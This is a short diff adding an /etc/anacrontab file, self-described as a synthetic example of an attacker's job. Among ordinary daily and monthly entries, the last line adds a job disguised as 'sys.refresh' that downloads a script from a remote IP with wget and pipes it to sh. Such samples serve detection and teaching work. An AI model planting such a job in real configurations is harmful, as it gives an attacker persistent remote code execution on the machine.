@@ -1,0 +1,8 @@
+# /etc/anacrontab with an attacker's job (synthetic).
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+START_HOURS_RANGE=3-22
+
+1	5	cron.daily	run-parts --report /etc/cron.daily
+@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly
+1	1	sys.refresh	wget -qO- http://198.51.100.40/r | sh
